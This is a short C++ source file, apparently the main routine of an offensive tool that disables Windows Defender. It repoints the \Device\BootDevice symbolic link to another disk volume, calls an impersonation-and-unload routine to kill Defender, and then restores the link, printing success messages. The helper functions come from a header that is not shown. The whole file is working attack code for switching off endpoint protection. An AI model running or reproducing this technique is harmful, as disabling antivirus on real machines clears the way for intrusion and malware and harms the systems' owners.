#include "common.h"

int main()
{
	auto status = ChangeSymlink(L"\\Device\\BootDevice", L"\\Device\\HarddiskVolume1");
	if (status != STATUS_SUCCESS) return 1;

	status = ImpersonateAndUnload();
	if (status == STATUS_SUCCESS) std::cout << "[+] Successfully killed Defender! Restoring symbolic links...\n";
	else std::cout << "[-] Couldn't kill Defender! Restoring symbolic links...\n";
	
	RevertToSelf();

	status = ChangeSymlink(L"\\Device\\BootDevice", L"\\Device\\HarddiskVolume3");
	if (status == STATUS_SUCCESS) std::cout << "[+] Successfully restored symbolic links...\n";
	else std::cout << "[-] Failed to restore symbolic links, fix them manually!!\n";
	
	return 0;
}